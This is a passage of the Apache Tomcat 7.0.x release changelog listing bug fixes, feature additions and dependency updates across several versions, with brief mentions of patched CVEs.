`RequestDispatcher` and the web application class loader. (markt) | | add | [62559](https://bz.apache.org/bugzilla/show_bug.cgi?id=62559): Add `jaxb-*.jar` to the list of JARs ignored by `StandardJarScanner`. (markt) | | add | [62560](https://bz.apache.org/bugzilla/show_bug.cgi?id=62560): Add `oraclepki.jar` to the list of JARs ignored by `StandardJarScanner`. (markt) | | add | [62607](https://bz.apache.org/bugzilla/show_bug.cgi?id=62607): Return a non-zero exit code from `catalina.[bat|sh] run` if Tomcat fails to start. (markt) | | code | Remove `ServletException` from declaration of `Tomcat.addWebapp(String,String)` since it is never thrown. Patch provided by Tzafrir. (markt) | | fix | Use short circuit logic to prevent potential NPE in CorsFilter. (fschumacher) | | code | Simplify construction of appName from container name in JAASRealm. (fschumacher) | | fix | Improve the handling of path parameters when working with RequestDispatcher objects. (markt) | | fix | [62664](https://bz.apache.org/bugzilla/show_bug.cgi?id=62664): Process requests with content type `multipart/form-data` to servlets with a `@MultipartConfig` annotation regardless of HTTP method. (markt) | | fix | [62669](https://bz.apache.org/bugzilla/show_bug.cgi?id=62669): When using the SSIFilter and a resource does not specify a content type, do not force the content type to `application/x-octet-stream`. (markt) | | fix | When generating a redirect to a directory in the Default Servlet, avoid generating a protocol relative redirect. (markt) | |  | **Coyote** | | --- | | | fix | Refactor code that adds an additional header name to the `Vary` HTTP response header to use a common utility method that addresses several additional edge cases. (markt) | | --- | --- | | fix | [62526](https://bz.apache.org/bugzilla/show_bug.cgi?id=62526): Correctly handle PKCS12 format key stores when the key store password is configured to be the empty string. Note that Java 6 does not support PKCS12 key stores configured to use a store password of the empty string. (markt) | | fix | [62670](https://bz.apache.org/bugzilla/show_bug.cgi?id=62670): Adjust the memory leak protection for the `DriverManager` so that JDBC drivers located in `$CATALINA_HOME/lib` and `$CATALINA_BASE/lib` are loaded via the service loader mechanism when the protection is enabled. (markt) | | fix | [62685](https://bz.apache.org/bugzilla/show_bug.cgi?id=62685): Correct an error in host name validation parsing that did not allow a fully qualified domain name to terminate with a period. Patch provided by AG. (markt) | |  | **Jasper** | | --- | | | fix | [53011](https://bz.apache.org/bugzilla/show_bug.cgi?id=53011): When pre-compiling with JspC, report all compilation errors rather than stopping after the first error. A new option `-failFast` can be used to restore the previous behaviour of stopping after the first error. Based on a patch provided by Marc Pompl. (markt) | | --- | --- | | add | [53492](https://bz.apache.org/bugzilla/show_bug.cgi?id=53492): Make the Java file generation process multi-threaded. By default, one thread will be used per core. Based on a patch by Dan Fabulich. (markt) | | fix | [62603](https://bz.apache.org/bugzilla/show_bug.cgi?id=62603): Fix a potential race condition when development mode is disabled and background compilation checks are enabled. It was possible that some updates would not take effect and/or `ClassNotFoundException`s would occur. (markt) | | fix | Correct the JSP version in the X-PoweredBy HTTP header generated when the xpoweredBy option is enabled. (markt) | | fix | [62662](https://bz.apache.org/bugzilla/show_bug.cgi?id=62662): Fix the corruption of web.xml output during JSP compilation caused by the fix for [53492](https://bz.apache.org/bugzilla/show_bug.cgi?id=53492). Patch provided by Bernhard Frauendienst. (markt) | | fix | Correct parsing of XML whitespace in TLD function signatures that incorrectly only looked for the space character. (markt) | |  | **WebSocket** | | --- | | | fix | [62596](https://bz.apache.org/bugzilla/show_bug.cgi?id=62596): Remove the limit on the size of the initial HTTP upgrade request used to establish the web socket connection. (markt) | | --- | --- | |  | **Web applications** | | --- | | | add | [62558](https://bz.apache.org/bugzilla/show_bug.cgi?id=62558): Add Russian translations for the Manager and Host Manager web applications. Based on a patch by Ivan Krasnov. (markt) | | --- | --- | | add | [62561](https://bz.apache.org/bugzilla/show_bug.cgi?id=62561): Add advanced class loader configuration information regarding the use of the Server and Shared class loaders to the documentation web application. (markt) | | add | Expand the information in the documentation web application regarding the use of `CATALINA_HOME` and `CATALINA_BASE`. Patch provided by Marek Czernek. (markt) | | fix | [62652](https://bz.apache.org/bugzilla/show_bug.cgi?id=62652): Make it clearer that the version of DBCP that is packaged in Tomcat 7.0.x is DBCP 1. (markt) | | add | [62666](https://bz.apache.org/bugzilla/show_bug.cgi?id=62666): Expand internationalisation support in the Manager application to include the server status page and provide Russian translations in addition to English. Patch provided by Artem Chebykin. (markt) | | fix | [62676](https://bz.apache.org/bugzilla/show_bug.cgi?id=62676): Expand the CORS filter documentation to make it clear that explicit configuration is required to enable support for cross-origin requests. (markt) | |  | **Tribes** | | --- | | | fix | Ensures that the specified `rxBufSize` is correctly set to receiver buffer size. (kfujino) | | --- | --- | |  | **Other** | | --- | | | fix | Fixed spelling. Patch provided by Jimmy Casey via GitHub. (violetagg) | | --- | --- | | fix | Correct various spelling errors throughout the source code and documentation. Patch provided by Kazuhiro Sera. (markt) | | | |  | **Tomcat 7.0.90 (violetagg)** | **released 2018-07-06** | | --- | --- | | | **Catalina** | | --- | | | fix | [62498](https://bz.apache.org/bugzilla/show_bug.cgi?id=62498): Correct a regression in the fix for CVE-2017-12617 that caused request failures for some requests when using the `VirtualDirContext`. (markt) | | --- | --- | | fix | Delete reference to removed class that prevented Tomcat from starting when running under a security manager. (markt) | | | |  | **Tomcat 7.0.89 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | JNDI resources that are defined with injection targets but no value are now treated as if the resource is not defined. (markt) | | --- | --- | | fix | Ensure that JNDI names used for `<lookup-name>` entries in web.xml and for `lookup` elements of `@Resource` annotations specify a name with an explicit `java:` namespace. (markt) | | add | [51953](https://bz.apache.org/bugzilla/show_bug.cgi?id=51953): Add the `RemoteCIDRFilter` and `RemoteCIDRValve` that can be used to allow/deny requests based on IPv4 and/or IPv6 client address where the IP ranges are defined using CIDR notation. Based on a patch by Francis Galiegue. (markt) | | fix | [62343](https://bz.apache.org/bugzilla/show_bug.cgi?id=62343): Make CORS filter defaults more secure. This is the fix for CVE-2018-8014. (markt) | | fix | Make all loggers associated with Tomcat provided Filters non-static to ensure that log messages are not lost when a web application is reloaded. (markt) | | fix | Correct the manifest for the annotations-api.jar. The JAR implements the Common Annotations API 1.1 and the manifest should reflect that. (markt) | | fix | Switch to non-static loggers where there is a possibility of a logger becoming associated with a web application class loader causing log messages to be lost if the web application is stopped. (markt) | | add | [62389](https://bz.apache.org/bugzilla/show_bug.cgi?id=62389): Add the IPv6 loopback address to the default `internalProxies` regular expression. Patch by Craig Andrews. (markt) | | fix | In the `RemoteIpValve` and `RemoteIpFilter`, correctly handle the case when the request passes through one or more `trustedProxies` but no `internalProxies`. Based on a patch by zhanhb. (markt) | | fix | Correct the logic in `MBeanFactory.removeConnector()` to ensure that the correct Connector is removed when there are multiple Connectors using different addresses but the same port. (markt) | | fix | Make `JAASRealm` mis-configuration more obvious by requiring the authenticated Subject to include at least one Principal of a type specified by `userClassNames`. (markt) | | fix | [62476](https://bz.apache.org/bugzilla/show_bug.cgi?id=62476): Use GMT timezone for the value of `Expires` header as required by HTTP specification (RFC 7231, 7234). (kkolinko) | |  | **Coyote** | | --- | | | fix | Log an error message if the AJP connector detects that the reverse proxy is sending AJP messages that are too large for the configured `packetSize`. (markt) | | --- | --- | | fix | [62371](https://bz.apache.org/bugzilla/show_bug.cgi?id=62371): Improve logging of Host validation failures. (markt) | | fix | Correctly handle a digest authorization header when the user name contains an escaped character. (markt) | | fix | Correctly handle a digest authorization header when one of the hex field values ends the header with in an invalid character. (markt) | |  | **Jasper** | | --- | | | fix | Update web.xml, web-fragment.xml and web.xml extracts generated by JspC to use the Servlet 3.0 version of the relevant schemas. (markt) | | --- | --- | | fix | Improve IPv6 validation by ensuring that IPv4-Mapped IPv6 addresses do not contain leading zeros in the IPv4 part. Based on a patch by Katya Stoycheva. (markt) | | fix | [62080](https://bz.apache.org/bugzilla/show_bug.cgi?id=62080): Ensure that all reads of the current thread's context class loader made by the UEL API and implementation are performed via a `PrivilegedAction` to ensure that a `SecurityException` is not triggered when running under a `SecurityManager`. (mark) | |  | **WebSocket** | | --- | | | fix | When decoding of path parameter failed, make sure to throw `DecodeException` instead of throwing `ArrayIndexOutOfBoundsException`. (kfujino) | | --- | --- | | fix | Enable host name verification when using TLS with the WebSocket client. (markt) | |  | **Web applications** | | --- | | | fix | [62395](https://bz.apache.org/bugzilla/show_bug.cgi?id=62395): Clarify the meaning of the connector attribute `minSpareThreads` in the documentation web application. (markt) | | --- | --- | |  | **jdbc-pool** | | --- | | | fix | When `logValidationErrors` is set to true, the connection validation error is logged as `SEVERE` instead of `WARNING`. (kfujino) | | --- | --- | |  | **Other** | | --- | | | fix | [62391](https://bz.apache.org/bugzilla/show_bug.cgi?id=62391): Remove references to `javaw.exe` as this file is not required by Tomcat and the references prevent the use of the Server JRE. (markt) | | --- | --- | | update | Update the packaged version of the Tomcat Native Library to 1.2.17 to pick up the latest Windows binaries built with APR 1.6.3 and OpenSSL 1.0.2o. (markt) | | add | Implement checksum checks when downloading dependencies that are used to build Tomcat. (kkolinko) | | | |  | **Tomcat 7.0.88 (violetagg)** | **released 2018-05-11** | | --- | --- | | | **Catalina** | | --- | | | fix | Treat the `<mapped-name>` element of a `<env-entry>` in web.xml in the same way as the `mappedName` element of the equivalent `@Resource` annotation. Both now attempt to set the `mappedName` property of the resource. (markt) | | --- | --- | | fix | Correct the processing of resources with `<injection-target>`s defined in web.xml. First look for a match using JavaBean property names and then, only if a match is not found, look for a match using fields. (markt) | | fix | When restoring a saved request with a request body after FORM authentication, ensure that calls to the `HttpServletRequest` methods `getRequestURI()`, `getQueryString()` and `getProtocol()` are not corrupted by the processing of the saved request body. (markt) | | fix | Fix startup failure when running under SecurityManager, a regression from the fix for bug [62273](https://bz.apache.org/bugzilla/show_bug.cgi?id=62273). (kkolinko) | | fix | [62353](https://bz.apache.org/bugzilla/show_bug.cgi?id=62353): Correct a regression introduced in Tomcat 7.0.86. Restore the ability for Tomcat 7 to run on Java 6 where Common Annotations 1.0 is available. Document the requirement to use the Java endorsed mechanism to use Common Annotations 1.1. (markt) | | code | Refactor the `org.apache.naming` package to reduce duplicate code. Duplicate code identified by the Simian tool. (markt) | | fix | [50019](https://bz.apache.org/bugzilla/show_bug.cgi?id=50019): Add support for `<lookup-name>`. Based on a patch by Gurkan Erdogdu. (markt) | | fix | [60490](https://bz.apache.org/bugzilla/show_bug.cgi?id=60490): Various formatting and layout improvements for the `ErrorReportValve`. Patch provided by Michael Osipov. (markt) | | fix | Relax Host validation by removing the requirement that the final component of a FQDN must be alphabetic. (markt) | |  | **Jasper** | | --- | | | add | [50234](https://bz.apache.org/bugzilla/show_bug.cgi?id=50234): Add the capability to generate a web-fragment.xml file to JspC. (markt) | | --- | --- | | fix | [62350](https://bz.apache.org/bugzilla/show_bug.cgi?id=62350): Refactor `org.apache.jasper.runtime.BodyContentImpl` so a `SecurityException` is not thrown when running under a SecurityManger and additional permissions are not required in the `catalina.policy` file. This is a follow-up to the fix for [43925](https://bz.apache.org/bugzilla/show_bug.cgi?id=43925). (kkolinko/markt) | |  | **Cluster** | | --- | | | fix | Remove duplicate calls when creating a replicated session to reduce the time taken to create the session and thereby reduce the chances of a subsequent session update message being ignored because the session does not yet exist. (markt) | | --- | --- | |  | **Tribes** | | --- | | | fix | Ensure that the correct default value is returned when retrieve unset properties in `McastService`. (kfujino) | | --- | --- | |  | **Other** | | --- | | | fix | Add a `.gitattributes` file to make sure that Git handles test data files for bug [52121](https://bz.apache.org/bugzilla/show_bug.cgi?id=52121) as binary. (kkolinko) | | --- | --- | | | |  | **Tomcat 7.0.87 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [62316](https://bz.apache.org/bugzilla/show_bug.cgi?id=62316): Correct a regression in some refactoring that broke the default factory for JDBC datasources. (markt) | | --- | --- | | fix | Fix a rare edge case that is unlikely to occur in real usage. This edge case meant that writing long streams of UTF-8 characters to the HTTP response that consisted almost entirely of surrogate pairs could result in one surrogate pair being dropped. (markt) | | fix | Register MBean when DataSource Resource `type="javax.sql.XADataSource"`. Patch provided by Masafumi Miura. (csutherl) | | add | Update the internal fork of Apache Commons BCEL to r1829827 to add early access Java 11 support to the annotation scanning code. (markt) | | fix | [62297](https://bz.apache.org/bugzilla/show_bug.cgi?id=62297): Enable the `CrawlerSessionManagerValve` to correctly handle bots that crawl multiple hosts and/or web applications when the Valve is configured on a Host or an Engine. (fschumacher) | | add | Collapse multiple leading `/` characters to a single `/` in the return value of `HttpServletRequest#getContextPath()` to avoid issues if the value is used with `HttpServletResponse#sendRedirect()`. This behaviour is enabled by default and configurable via the new Context attribute `allowMultipleLeadingForwardSlashInPath`. (markt) | | fix | Improve handing of overflow in the UTF-8 decoder with supplementary characters. (markt) | |  | **Coyote** | | --- | | | add | Enable strict validation of the provided host name and port for all connectors. Requests with invalid host names and/or ports will be rejected with a 400 response. (markt) | | --- | --- | | fix | Implement the requirements of RFC 7230 (and RFC 2616) that HTTP/1.1 requests must include a `Host` header and any request that does not must be rejected with a 400 response. (markt) | | fix | Implement the requirements of RFC 7230 that any HTTP/1.1 request that specifies a host in the request line, must specify the same host in the `Host` header and that any such request that does not, must be rejected with a 400 response. This check is optional and disabled by default. It may be enabled with the `allowHostHeaderMismatch` attribute of the Connector. (markt) | | fix | Implement the requirements of RFC 7230 that any HTTP/1.1 request that contains multiple `Host` headers is rejected with a 400 response. (markt) | | add | [62273](https://bz.apache.org/bugzilla/show_bug.cgi?id=62273): Implement configuration options to work-around specification non-compliant user agents (including all the major browsers) that do not correctly %nn encode URI paths and query strings as required by RFC 7230 and RFC 3986. (markt) | |  | **Jasper** | | --- | | | fix | Enable ECJ version 4.7 and later to be used as a drop in replacement for the ECJ version that ships with Apache Tomcat. (markt) | | --- | --- | | fix | Enable Java 10 to be specified as a JSP source and/or target if a newer ECJ version is used. (markt) | | fix | [62287](https://bz.apache.org/bugzilla/show_bug.cgi?id=62287): Do not rely on hash codes to test instances of `ValueExpressionImpl` for equality. Patch provided by Mark Struberg. (markt) | |  | **WebSocket** | | --- | | | fix | [62301](https://bz.apache.org/bugzilla/show_bug.cgi?id=62301): Correct a regression in the fix for [61491](https://bz.apache.org/bugzilla/show_bug.cgi?id=61491) that didn't correctly handle a final empty message part in all circumstances when using `PerMessageDeflate`. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | Avoid warning when running under Cygwin when the `JAVA_ENDORSED_DIRS` environment variable is not set. Patch provided by Zemian Deng. (markt) | | --- | --- | | | |  | **Tomcat 7.0.86 (violetagg)** | **released 2018-04-13** | | --- | --- | | | **Catalina** | | --- | | | fix | [51195](https://bz.apache.org/bugzilla/show_bug.cgi?id=51195): Avoid a false positive report of a web application memory leak by clearing `ObjectStreamClass$Caches` of classes loaded by the web application when the web application is stopped. (markt) | | --- | --- | | fix | [52688](https://bz.apache.org/bugzilla/show_bug.cgi?id=52688): Add support for the `maxDays` attribute to the `AccessLogValve` and `ExtendedAccessLogValve`. This allows the maximum number of days for which rotated access logs should be retained before deletion to be defined. (markt) | | fix | Prevent Tomcat from applying gzip compression to content that is already compressed with brotli compression. Based on a patch provided by burka. (markt) | | fix | [62090](https://bz.apache.org/bugzilla/show_bug.cgi?id=62090): Null container names are not allowed. (remm) | | fix | [62104](https://bz.apache.org/bugzilla/show_bug.cgi?id=62104): Fix programmatic login regression as the NonLoginAuthenticator has to be set for it to work (if no login method is specified). (remm) | | fix | [62117](https://bz.apache.org/bugzilla/show_bug.cgi?id=62117): Improve error message in `catalina.sh` when calling `kill -0 <pid>` fails. Based on a suggestion from Mark Morschhaeuser. (markt) | | fix | [62118](https://bz.apache.org/bugzilla/show_bug.cgi?id=62118): Correctly create a JNDI `ServiceRef` using the specified interface rather than the concrete type. Based on a suggestion by Ángel Álvarez Páscua. (markt) | | fix | Fix for `RequestDumperFilter` log attribute. Patch provided by Kirill Romanov via Github. (violetagg) | | fix | [62123](https://bz.apache.org/bugzilla/show_bug.cgi?id=62123): Avoid `ConcurrentModificationException` when attempting to clean up application triggered RMI memory leaks on web application stop. (markt) | | fix | [62168](https://bz.apache.org/bugzilla/show_bug.cgi?id=62168): When using the `PersistentManager` honor a value of `-1` for `minIdleSwap` and do not swap out sessions to keep the number of active sessions under `maxActive`. Patch provided by Holger Sunke. (markt) | | fix | [62172](https://bz.apache.org/bugzilla/show_bug.cgi?id=62172): Improve Javadoc for `org.apache.catalina.startup.Constants` and ensure that the constants are correctly used. (markt) | | fix | [62175](https://bz.apache.org/bugzilla/show_bug.cgi?id=62175): Avoid infinite recursion, when trying to validate a session while loading it with `PersistentManager`. (fschumacher) | | fix | Ensure that `NamingContextListener` instances are only notified once of property changes on the associated naming resources. (markt) | | add | [62224](https://bz.apache.org/bugzilla/show_bug.cgi?id=62224): Disable the `forkJoinCommonPoolProtection` of the `JreMemoryLeakPreventionListener` when running on Java 9 and above since the underlying JRE bug has been fixed. (markt) | | fix | [62263](https://bz.apache.org/bugzilla/show_bug.cgi?id=62263): Avoid a `NullPointerException` when the `RemoteIpValve` processes a request for which no Context can be found. (markt) | |  | **Coyote** | | --- | | | fix | Correct off-by-one error in thread pool that allowed thread pools to increase in size to one more than the configured limit. Patch provided by usc. (markt) | | --- | --- | |  | **Web applications** | | --- | | | add | Work-around a known, non-specification compliant behaviour in some versions of IE that can allow XSS when the Manager application generates a plain text response. Based on a suggestion from Muthukumar Marikani. (markt) | | --- | --- | | add | Add document for `FragmentationInterceptor`. (kfujino) | | add | Document how the roles for an authenticated user are determined when the `CombinedRealm` is used. (markt) | |  | **jdbc-pool** | | --- | | | fix | Ensure that `SQLWarning` has been cleared when connection returns to the pool. (kfujino) | | --- | --- | | fix | Ensure that parameters have been cleared when `PreparedStatement` and/or `CallableStatement` are cached. (kfujino) | | fix | Enable PoolCleaner to be started even if `validationQuery` is not set. (kfujino) | |  | **Other** | | --- | | | update | Update the build script so MD5 hashes are no longer generated for releases as per the change in the ASF distribution policy. (markt) | | --- | --- | | fix | [62164](https://bz.apache.org/bugzilla/show_bug.cgi?id=62164): Switch the build script to use TLS for downloads from SourceForge and Maven Central to avoid failures due to HTTP to HTTPS redirects. (markt) | | | |  | **Tomcat 7.0.85 (violetagg)** | **released 2018-02-13** | | --- | --- | | | **Catalina** | | --- | | | fix | Prevent a stack trace being written to standard out when running on Java 10 due to changes in the `LogManager` implementation. (markt) | | --- | --- | | fix | Avoid duplicate load attempts if one has been made already. (remm) | | fix | Avoid NPE in ThreadLocalLeakPreventionListener if there is no Engine. (remm) | | fix | [58143](https://bz.apache.org/bugzilla/show_bug.cgi?id=58143): Fix calling classloading transformers broken in 7.0.70 by the fix for [59619](https://bz.apache.org/bugzilla/show_bug.cgi?id=59619). This was observed when using Spring weaving. (rjung) | | fix | [62000](https://bz.apache.org/bugzilla/show_bug.cgi?id=62000): When a JNDI reference cannot be resolved, ensure that the root cause exception is reported rather than swallowed. (markt) | | fix | [62036](https://bz.apache.org/bugzilla/show_bug.cgi?id=62036): When caching an authenticated user Principal in the session when the web application is configured with the `NonLoginAuthenticator`, cache the internal Principal object rather than the user facing Principal object as Tomcat requires the internal object to correctly process later authorization checks. (markt) | | fix | [62067](https://bz.apache.org/bugzilla/show_bug.cgi?id=62067): Correctly apply security constraints mapped to the context root using a URL pattern of `""`. (markt) | | fix | When using Tomcat embedded, only perform Authenticator configuration once during web application start. (markt) | | fix | Process all `ServletSecurity` annotations at web application start rather than at servlet load time to ensure constraints are applied consistently. (markt) | | fix | Minor optimization when calling class transformers. (rjung) | |  | **Web applications** | | --- | | | add | [48672](https://bz.apache.org/bugzilla/show_bug.cgi?id=48672): Add documentation for the Host Manager web application. Patch provided by Marek Czernek. (markt) | | --- | --- | |  | **Other** | | --- | | | update | Update the NSIS Installer used to build the Windows installer to version 3.03. (kkolinko) | | --- | --- | | | |  | **Tomcat 7.0.84 (violetagg)** | **released 2018-01-24** | | --- | --- | | | **Catalina** | | --- | | | fix | [47214](https://bz.apache.org/bugzilla/show_bug.cgi?id=47214): Use a loop to preload anonymous inner classes when running under a `SecurityManager`, to be safe for future changes in the code or using a different compiler. (kkolinko) | | --- | --- | | add | [57619](https://bz.apache.org/bugzilla/show_bug.cgi?id=57619): Implement a small optimisation to how JAR URLs are processed to reduce the storage of duplicate String objects in memory. Patch provided by Dmitri Blinov. (markt) | | add | [61810](https://bz.apache.org/bugzilla/show_bug.cgi?id=61810): Support configure the interval to keep all jars open if no jar is accessed, a non-positive interval indicates keeping jars always open. (huxing) | | fix | [61886](https://bz.apache.org/bugzilla/show_bug.cgi?id=61886): Pre-load additional classes to prevent `SecurityException`s if the first request received when running under a `SecurityManager` is an asynchronous Servlet. (markt) | | fix | [61916](https://bz.apache.org/bugzilla/show_bug.cgi?id=61916): Extend the `AddDefaultCharsetFilter` to add a character set when the content type is set via `setHeader()` or `addHeader()` as well as when it is set via `setContentType()`. (markt) | | fix | [61999](https://bz.apache.org/bugzilla/show_bug.cgi?id=61999): maxSavePostSize set to 0 should disable saving POST data during authentication. (remm) | |  | **Coyote** | | --- | | | fix | [61886](https://bz.apache.org/bugzilla/show_bug.cgi?id=61886): Log errors on non-container threads at `DEBUG` rather than `INFO`. The exception will be made available to the application via the asynchronous error handling mechanism. (markt) | | --- | --- | | fix | [61993](https://bz.apache.org/bugzilla/show_bug.cgi?id=61993): Improve handling for `ByteChunk` and `CharChunk` instances that grow close to the maximum size allowed by the JRE. (markt) | |  | **Jasper** | | --- | | | add | [43925](https://bz.apache.org/bugzilla/show_bug.cgi?id=43925): Add a new system property (`org.apache.jasper.runtime.BodyContentImpl.BUFFER_SIZE`) to control the size of the buffer used by Jasper when buffering tag bodies. (markt) | | --- | --- | |  | **Web applications** | | --- | | | add | [61223](https://bz.apache.org/bugzilla/show_bug.cgi?id=61223): Add the mbeans-descriptors.dtd file to the custom MBean documentation so users have a reference to use when constructing mbeans-descriptors.xml files for custom components. (markt) | | --- | --- | | fix | Partial fix for [61886](https://bz.apache.org/bugzilla/show_bug.cgi?id=61886). Ensure that multiple threads do not attempt to complete the `AsyncContext` if an I/O error occurs in the stock ticker example Servlet. (markt) | | fix | [61886](https://bz.apache.org/bugzilla/show_bug.cgi?id=61886): Prevent `ConcurrentModificationException` when running the asynchronous stock ticker in the examples web application. (markt) | | fix | [61886](https://bz.apache.org/bugzilla/show_bug.cgi?id=61886): Prevent `NullPointerException` and other errors if the stock ticker example is running when the examples web application is stopped. (markt) | | fix | [61910](https://bz.apache.org/bugzilla/show_bug.cgi?id=61910): Clarify the meaning of the `allowLinking` option in the documentation web application. (markt) | | add | Add OCSP configuration information to the SSL How-To. Patch provided by Marek Czernek. (markt) | | fix | [62006](https://bz.apache.org/bugzilla/show_bug.cgi?id=62006): Document the new `JvmOptions9` command line parameter for `tomcat7.exe`. (markt) | |  | **jdbc-pool** | | --- | | | fix | [61312](https://bz.apache.org/bugzilla/show_bug.cgi?id=61312): Prevent `NullPointerException` when using the statement cache of connection that has been closed. (kfujino) | | --- | --- | |  | **Other** | | --- | | | update | Update the internal fork of Commons FileUpload to 6c00d57 (2017-11-23) to pick up some code clean-up. (markt) | | --- | --- | | update | Update the internal fork of Commons Codec to r1817136 to pick up some code clean-up. (markt) | | fix | The native source bundles (for Commons Daemon and Tomcat Native) are no longer copied to the bin directory for the deploy target. They are now only copied to the bin directory for the release target. (markt) | | | |  | **Tomcat 7.0.83 (violetagg)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | add | When running under Java 9 or later, and the `urlCacheProtection` option of the `JreMemoryLeakPreventionListener` is enabled, use the API added in Java 9 to only disable the caching for JAR URL connections. (markt) | | --- | --- | | fix | [61581](https://bz.apache.org/bugzilla/show_bug.cgi?id=61581): Fix possible `SecurityException` when using the APR/native connector with a `SecurityManager`. (markt) | | fix | [61597](https://bz.apache.org/bugzilla/show_bug.cgi?id=61597): Extend the `StandardJarScanner` to scan JARs on the module path when running on Java 9 and class path scanning is enabled. (markt) | | fix | Fix the JMX descriptor for `Wrapper.findInitParameter()`. (rjung) | | fix | [61601](https://bz.apache.org/bugzilla/show_bug.cgi?id=61601): Add support for multi-release JARs in JAR scanning and web application class loading. (markt) | | fix | Revert the change from 7.0.80 that called `ServletResponse.setLocale()` if the `Content-Language` HTTP header was set directly. (markt) | | add | Provide the `SessionInitializerFilter` that can be used to ensure that an HTTP session exists when initiating a WebSocket connection. Patch provided by isapir. (markt) | | fix | Avoid a possible `NullPointerException` when timing out `AsyncContext` instances during shut down. (markt) | |  | **Coyote** | | --- | | | fix | [57870](https://bz.apache.org/bugzilla/show_bug.cgi?id=57870): When running on Java 7 or later, take advantage of the new `syncFlush` parameter when constructing a `GZIPOutputStream` rather than using the custom `FlushableGZIPOutputStream` implementation as a work-around. (markt) | | --- | --- | | fix | [61736](https://bz.apache.org/bugzilla/show_bug.cgi?id=61736): Improve performance of NIO connector when clients leave large time gaps between network packets. Patch provided by Zilong Song. (markt) | |  | **Jasper** | | --- | | | add | Enable Jasper to compile JSPs for Java 9. In addition to configuring the JSP servlet with for Java 9 via the `compilerSourceVM` and `compilerTargetVM`, it is necessary to replace `ecj-4.4.2.jar` with a more recent version that supports Java 9. (markt) | | --- | --- | | fix | [61816](https://bz.apache.org/bugzilla/show_bug.cgi?id=61816): Invalid expressions in attribute values or template text should trigger a translation (compile time) error, not a run time error. (markt) | |  | **WebSocket** | | --- | | | fix | [61604](https://bz.apache.org/bugzilla/show_bug.cgi?id=61604): Add support for authentication in the websocket client. Patch submitted by J Fernandez. (remm) | | --- | --- | |  | **Web applications** | | --- | | | fix | [61603](https://bz.apache.org/bugzilla/show_bug.cgi?id=61603): Add XML filtering for the status servlet output where needed. (remm) | | --- | --- | | fix | Correct the description of how the CGI servlet maps a request to a script in the CGI How-To. (markt) | |  | **Tribes** | | --- | | | fix | Fix incorrect behavior that attempts to resend channel messages more than the actual setting value of `maxRetryAttempts`. (kfujino) | | --- | --- | | fix | Ensure that the remaining Sender can send channel messages by avoiding unintended `ChannelException` caused by comparing the number of failed members and the number of remaining Senders. (kfujino) | | fix | Ensure that remaining SelectionKeys that were not handled by throwing a `ChannelException` during SelectionKey processing are handled. (kfujino) | |  | **Other** | | --- | | | fix | Improve the fix for [61439](https://bz.apache.org/bugzilla/show_bug.cgi?id=61439) and exclude the JPA, JAX-WS and EJB annotations completely from the Tomcat distributions. (markt) | | --- | --- | | fix | Improve handling of endorsed directories. The endorsed directory mechanism will only be used if the `JAVA_ENDORSED_DIRS` system property is explicitly set or if `$CATALINA_HOME/endorsed` exists. When running on Java 9, any such attempted use of the endorsed directory mechanism will trigger an error and Tomcat will fail to start. (rjung) | | code | Refactoring in preparation for Java 9. Refactor to avoid using some methods that will be deprecated in Java 9 onwards. (markt) | | add | [51496](https://bz.apache.org/bugzilla/show_bug.cgi?id=51496): When using the Windows installer, check if the requested service name already exists and, if it does, prompt the user to select an alternative service name. Patch provided by Ralph Plawetzki. (markt) | | fix | Add necessary Java 9 configuration options to the startup scripts to prevent warnings being generated on web application stop. (markt) | | fix | [61590](https://bz.apache.org/bugzilla/show_bug.cgi?id=61590): Enable `service.bat` to recognise when `JAVA_HOME` is configured for a Java 9 JDK. (markt) | | fix | [61598](https://bz.apache.org/bugzilla/show_bug.cgi?id=61598): Update the Windows installer to search the new (as of Java 9) registry locations when looking for a JRE. (markt) | | add | Add generation of a SHA-512 hash for release artifacts to the build script. (markt) | | fix | [61658](https://bz.apache.org/bugzilla/show_bug.cgi?id=61658): Update MIME mappings for fonts to use `font/*` as per RFC8081. (markt) | | update | Update the packaged version of the Tomcat Native Library to 1.2.16 to pick up the latest Windows binaries built with APR 1.6.3 and OpenSSL 1.0.2m. (markt) | | update | Update the NSIS Installer used to build the Windows installer to version 3.02.1. (kkolinko) | | update | Update the Windows installer to use "The Apache Software Foundation" as the Publisher when Tomcat is displayed in the list of installed applications in Microsoft Windows. (kkolinko) | | fix | [61803](https://bz.apache.org/bugzilla/show_bug.cgi?id=61803): Remove outdated SSL information from the Security documentation. (remm) | | | |  | **Tomcat 7.0.82 (violetagg)** | **released 2017-10-03** | | --- | --- | | | **Catalina** | | --- | | | fix | [61210](https://bz.apache.org/bugzilla/show_bug.cgi?id=61210): When running under a SecurityManager, do not print a warning about not being able to read a logging configuration file when that file does not exist. (markt) | | --- | --- | | add | [61280](https://bz.apache.org/bugzilla/show_bug.cgi?id=61280): Add RFC 7617 support to the `BasicAuthenticator`. Note that the default configuration does not change the existing behaviour. (markt) | | fix | [61452](https://bz.apache.org/bugzilla/show_bug.cgi?id=61452): Fix a copy paste error that caused an `UnsupportedEncodingException` when using WebDAV. (markt) | | fix | Correct regression in 7.0.80 that broke the use of relative paths with the `extraResourcePaths` attribute of a `VirtualDirContext`. (markt) | | add | [61489](https://bz.apache.org/bugzilla/show_bug.cgi?id=61489): When using the CGI servlet, make the generation of command line arguments from the query string (as per section 4.4 of RFC 3875) optional. The feature is enabled by default for consistency with previous releases. Based on a patch by jm009. (markt) | | fix | Correct a regression in 7.0.80 and 7.0.81 that wrapped the `DirContext` that represented the web application in a `ProxyDirContext` twice rather than just once. (markt) | | fix | [61542](https://bz.apache.org/bugzilla/show_bug.cgi?id=61542): Fix CVE-2017-12617 and prevent JSPs from being uploaded via a specially crafted request when HTTP PUT was enabled. (markt) | | fix | Use the correct path when loading the JVM `logging.properties` file for Java 9. (rjung) | | fix | [61554](https://bz.apache.org/bugzilla/show_bug.cgi?id=61554): Exclude test files in unusual encodings and markdown files intended for display in GitHub from RAT analysis. Patch provided by Chris Thistlethwaite. (markt) | |  | **Coyote** | | --- | | | fix | [48655](https://bz.apache.org/bugzilla/show_bug.cgi?id=48655): Enable Tomcat to shutdown cleanly when using sendfile, the APR/native connector and a multi-part download is in progress. (markt) | | --- | --- | | fix | [58244](https://bz.apache.org/bugzilla/show_bug.cgi?id=58244): Handle the case when OpenSSL resumes a TLS session using a ticket and the full client certificate chain is not available. In this case the client certificate without the chain will be presented to the 